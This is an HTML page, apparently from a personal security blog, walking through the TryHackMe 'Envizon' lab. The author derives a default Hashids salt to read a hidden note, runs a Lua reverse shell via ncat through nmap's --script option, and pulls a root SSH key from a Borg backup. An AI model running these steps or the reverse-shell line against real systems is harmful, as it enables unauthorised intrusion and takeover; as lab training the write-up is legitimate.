@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xlondra.github.io">
+    <title>Envizon - Tryhackme - Walkthrough</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Tryhackme - Envizon - Walkthrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 23-03-2026</li>
+                    <li><strong>Platform:</strong> Tryhackme</li>
+                    <li><strong>Difficulty:</strong> Hard</li>
+                    <li><strong>Link:</strong> <a href="https://tryhackme.com/room/envizon" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">RCE</span>
+                        <span class="tag">Docker</span>
+                        <span class="tag">nmap</span>
+                    </li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>This room provides three hints at the beginning:</p>
+                <ul>
+                    <li>This is not an empty instance. Assume it is or was used and contains user data.</li>
+                    <li>A note feature is currently under development.</li>
+                    <li>When looking for code execution, the most obvious path is usually the correct one—it is important to understand what the application does.</li>
+                </ul>
+
+                <p>The source code of the application is also provided:</p>
+                <a href="https://gitlab.com/evait-security/envizon_thm/" target="_blank" class="link">Hosted on GitLab</a>
+
+                <p>I started by adding the target IP to <b>/etc/hosts</b> as <b>envizon.thm</b>.</p>
+
+                <p>Then I performed a full Nmap scan:</p>
+                <img src="images/nmap1.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -p- envizon.thm">└─$ sudo nmap -p- envizon.thm</code></pre>
+                </div>
+
+                <p>This revealed a service running on port 3000, which is likely the main target.</p>
+                <p>Initially, nothing showed up in the browser until I tried using <b>HTTPS</b>:</p>
+
+                <span class="path">https://envizon.thm:3000/users/sign_in</span>
+                <img src="images/loginpanel.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>I cloned the application using the following command:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="git clone https://gitlab.com/evait-security/envizon_thm.git">git clone https://gitlab.com/evait-security/envizon_thm.git</code></pre>
+                </div>
+
+                <p>This is a <b>Ruby on Rails</b> application, which follows the <b>MVC</b> pattern.<br>
+                After some time inspecting the code, I found the <b>note_controller.rb</b> controller.<br>
+                I came across the following code:</p>
+
+<details class="code-block">
+<summary>GET endpoint (Ruby)</summary>
+<pre><code># GET /notes/1
+# GET /notes/1.json
+def show
+end
+</code></pre>
+</details>
+
+                <p>I navigated to:</p>
+                <span class="path">https://envizon.thm:3000/notes/1</span>
+
+                <p>It displayed the following message:</p>
+                <img src="images/noteid1.png" class="lab-image zoomable">
+
+                <p>
+                    The message states that the password is stored in a note with ID <b>380</b>.<br>
+                    However, when I tried accessing it directly:
+                </p>
+
+                <span class="path">https://envizon.thm:3000/notes/380</span>
+
+                <p>
+                    It did not exist.<br><br>
+                    The message also mentions <b>acts_as_hashids</b>, which indicates that the application does not expose raw numeric IDs, but encoded ones.<br><br>
+                    After viewing the page source (CTRL+U), I found the actual URL used for note <b>1</b>:
+                </p>
+
+                <span class="path">https://envizon.thm:3000/notes/Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw</span>
+
+                <p>
+                    This confirms that note IDs are encoded using Hashids.<br>
+                    So instead of accessing <code>/notes/1</code>, the application uses a Hashid representation.<br><br>
+                    At this point, my goal was to generate the Hashid for <b>380</b> to access that note.
+                </p>
+
+                <p>I searched the source code for how Hashids was configured:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="grep -Ri 'hashid' .">grep -Ri 'hashid' .</code></pre>
+                </div>
+
+                <p>This led me to the following line in <b>app/models/note.rb</b>:</p>
+
+                <pre><code>acts_as_hashids length: 30</code></pre>
+
+                <p>
+                    I noticed that only the length was defined and no salt was specified.<br><br>
+                    From the documentation, if no salt is provided, a default value is used—often derived from the model name.<br><br>
+                    Since the model is called <b>Note</b>, I assumed the salt was:
+                </p>
+
+                <pre><code>"Note"</code></pre>
+
+                <p>
+                    To verify this, I recreated the hash generation locally using a known mapping:<br>
+                    note <b>1</b> → <code>Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw</code>
+                </p>
+
+<details class="code-block">
+<summary>Hashid generator (Python)</summary>
+<pre><code>from hashids import Hashids
+
+id = 1
+
+hash = Hashids(salt="Note", min_length=30)
+print(hash.encode(id))
+</code></pre>
+</details>
+
+                <p>
+                    The output matched exactly, confirming that the salt was correct.<br><br>
+                    I then generated the hash for note <b>380</b>.
+                </p>
+
+                <p>
+                    Using the generated hash, I accessed:
+                </p>
+
+                <span class="path">https://envizon.thm:3000/notes/&lt;generated_hash&gt;</span>
+
+                <p>This revealed the application password:</p>
+
+                <img src="images/answer1password.png" class="lab-image zoomable">
+                <p>I used this password to log in:</p>
+                <img src="images/loggedin.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>I noticed an upload option in the Nmap section.<br>
+                I uploaded a test file and then clicked <b>Tasks</b> in the navigation bar.</p>
+
+                <img src="images/uploadTest.txt.png" class="lab-image zoomable">
+
+                <p>In the <b>Retries</b> section, I found the full path of the uploaded file:</p>
+
+                <img src="images/fullLocation.png" class="lab-image zoomable">
+
+                <p>This can be used to upload a Lua script and execute it through Nmap using the <b>--script</b> argument.</p>
+
+                <p>I created the following Lua script:</p>
+
+<details class="code-block">
+<summary>Reverse Shell (Lua)</summary>
+<pre><code>os.execute("ncat 192.168.169.133 1234 -e /bin/sh")
+</code></pre>
+</details>
+
+                <p>I uploaded it the same way as before, naming it <b>londra_shell</b>.<br>
+                Then I navigated to <b>Manual Scan</b> and entered the following parameter:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="nmap --script /usr/src/app/envizon/nmap/uploads/londra_shell_0.xml">nmap --script /usr/src/app/envizon/nmap/uploads/londra_shell_0.xml</code></pre>
+                </div>
+
+                <img src="images/londra_shell_execute.png" class="lab-image zoomable">
+
+                <p>Make sure to use your own IP as the target.</p>
+
+                <p>Before executing, I started a Netcat listener on port <b>1234</b>.<br>
+                After running the scan, I received a reverse shell:</p>
+
+                <img src="images/reverseShellProof.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
+
+                <p>Once inside, I navigated to <b>/root</b> and found the first flag:</p>
+
+                <img src="images/firstflag.png" class="lab-image zoomable">
+
+                <p>Next, I looked for backups (as mentioned in the last tip) and found <b>/var/backup</b>.<br>
+                Inside was a README stating:</p>
+                <br>
+                <p><b>This is a Borg Backup repository.<br>
+                See https://borgbackup.readthedocs.io/</b></p>
+
+                <p>The system uses <b>Borg</b> for backups. I checked <b>/etc/borgmatic</b> and found <b>config.yaml</b>:</p>
+
+                <span class="path">encryption_passcommand: 'echo BORG_PASSPHRASE'</span>
+
+                <p>I exported the passphrase:</p>
+
+                <pre><code>export BORG_PASSPHRASE=BORG_PASSPHRASE_HERE</code></pre>
+
+                <p>Then listed available backups:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="borg list /var/backup">borg list /var/backup</code></pre>
+                </div>
+
+                <img src="images/borglist.png" class="lab-image zoomable">
+
+                <p>I extracted one of the backups:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="borg extract /var/backup::envizon-2020-09-30T23:25:30.466049">borg extract /var/backup::envizon-2020-09-30T23:25:30.466049</code></pre>
+                </div>
+
+                <p>This created a <b>root</b> directory. Inside, I found the <b>.ssh</b> folder containing a private key:</p>
+
+                <img src="images/privateSshKey.png" class="lab-image zoomable">
+
+                <p>I copied the key into a file named <b>id_rsa</b> and used it to connect via SSH:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="chmod 600 id_rsa && ssh -i id_rsa root@envizon.thm">└─$ chmod 600 id_rsa && ssh -i id_rsa root@envizon.thm</code></pre>
+                </div>
+
+                <img src="images/sshAccess.png" class="lab-image zoomable">
+
+                <p>This gave me root access. The final flag was located in the home directory:</p>
+
+                <img src="images/rootflag.png" class="lab-image zoomable">
+
+                <p>That's it, thanks for reading, I hope that you, just like me, learned something new today.</p>
+            </section>
+        </article>
+    </main>
+    
+    <footer>
+        Copyleft &copy; <span id="year"></span>
+    </footer>
+</body>
+</html>
